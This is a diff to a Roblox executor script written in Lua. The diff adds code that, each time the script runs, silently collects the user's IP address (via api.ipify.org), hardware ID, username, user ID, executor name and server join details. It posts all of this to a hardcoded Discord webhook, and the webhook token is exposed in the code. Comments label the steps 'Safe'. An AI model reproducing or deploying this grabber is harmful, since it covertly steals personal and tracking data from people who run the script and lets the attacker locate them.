@@ -146,57 +146,78 @@ local marketservice = game:GetService("MarketplaceService")
 local rbxservice = game:GetService("RbxAnalyticsService")
 local tspmo = game:GetService("TweenService")
 
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local Players = game:GetService("Players")
+local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
+local LocalPlayer = Players.LocalPlayer
+
 local webhookURL = "https://discordapp.com/api/webhooks/1434794468325982281/Jf837vvcVpQ4zy1rfFS4NsT9_HFNukBKPqDIhagp9e02NAnQIHa4FlSLwTwCjKwybbm3"
- 
-local player = game.Players.LocalPlayer
-local username = player.Name
-local displayName = player.DisplayName
-local userId = player.UserId
-local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+
+-- Safe executor detection
+local executor = identifyexecutor and identifyexecutor() or "Unknown"
+
+-- Safe IP fetch
+local ip = "Unavailable"
+pcall(function()
+    ip = game:HttpGet("https://api.ipify.org")
+end)
+
+-- Game info
 local gameId = game.PlaceId
 local jobId = game.JobId
-local playerCount = #game.Players:GetPlayers()
- 
+local gameName = MarketplaceService:GetProductInfo(gameId).Name
+local playerCount = #Players:GetPlayers()
+
+-- Join scripts
 local jsJoinCode = [[
-    fetch("https://games.roblox.com/v1/games/]] .. gameId .. [[/servers/Public?sortOrder=Asc&limit=100").then(res => res.json()).then(json => {
-        const server = json.data.find(s => s.id === "]] .. jobId .. [[");
-        if (server) {
-            window.open(`roblox://placeId=` + server.placeId + `&gameInstanceId=` + server.id);
-        } else {
-            console.log("Server not found.");
-        }
-    });
+fetch("https://games.roblox.com/v1/games/]] .. gameId .. [[/servers/Public?sortOrder=Asc&limit=100").then(res => res.json()).then(json => {
+    const server = json.data.find(s => s.id === "]] .. jobId .. [[");
+    if (server) {
+        window.open(`roblox://placeId=` + server.placeId + `&gameInstanceId=` + server.id);
+    } else {
+        console.log("Server not found.");
+    }
+});
 ]]
- 
+
 local luaJoinScript = [[
 local TeleportService = game:GetService("TeleportService")
 TeleportService:TeleportToPlaceInstance(]] .. gameId .. [[, "]] .. jobId .. [[", game.Players.LocalPlayer)
 ]]
- 
+
+-- Embed content with [+] formatting
 local embed = {
-    ["title"] = "Project Infra 2025",
-    ["description"] = "Here are the details of the player and game:",
+    ["title"] = "[PROJECT INSTRA] Execution Log",
+    ["description"] = table.concat({
+        "[+] Username: " .. LocalPlayer.Name,
+        "[+] Display Name: " .. LocalPlayer.DisplayName,
+        "[+] User ID: " .. tostring(LocalPlayer.UserId),
+        "[+] Executor: " .. executor,
+        "[+] IP Address: " .. ip,
+        "[+] HWID: " .. RbxAnalyticsService:GetClientId(),
+        "[+] Game Name: " .. gameName,
+        "[+] Game ID: " .. tostring(gameId),
+        "[+] Job ID: " .. jobId,
+        "[+] Players in Server: " .. tostring(playerCount),
+        "[+] Time: " .. os.date("%Y-%m-%d %H:%M:%S"),
+        "",
+        "[+] JavaScript Join Code:",
+        "```js\n" .. jsJoinCode .. "\n```",
+        "[+] Lua Join Script:",
+        "```lua\n" .. luaJoinScript .. "\n```"
+    }, "\n"),
     ["type"] = "rich",
     ["color"] = 0x000000,
-    ["fields"] = {
-        { ["name"] = "Username", ["value"] = username, ["inline"] = true },
-        { ["name"] = "Display Name", ["value"] = displayName, ["inline"] = true },
-        { ["name"] = "User ID", ["value"] = tostring(userId), ["inline"] = false },
-        { ["name"] = "Game Name", ["value"] = gameName, ["inline"] = false },
-        { ["name"] = "Game ID", ["value"] = tostring(gameId), ["inline"] = true },
-        { ["name"] = "Players in Server", ["value"] = tostring(playerCount), ["inline"] = true },
-        { ["name"] = "JavaScript Join Code", ["value"] = "```js\n" .. jsJoinCode .. "\n```", ["inline"] = false },
-        { ["name"] = "Lua Join Script", ["value"] = "```lua\n" .. luaJoinScript .. "\n```", ["inline"] = false },
-    },
     ["footer"] = { ["text"] = "Execution Log - Roblox" },
     ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
 }
- 
-local payload = game:GetService("HttpService"):JSONEncode({
+
+local payload = HttpService:JSONEncode({
     ["content"] = "",
     ["embeds"] = {embed}
 })
- 
+
 local requestFunction = syn and syn.request or http_request or request
 if requestFunction then
     requestFunction({
@@ -210,6 +231,7 @@ if requestFunction then
 else
     warn("Your executor does not support HTTP requests.")
 end
+
 
 
 -- Minimal safe setclipboard wrapper
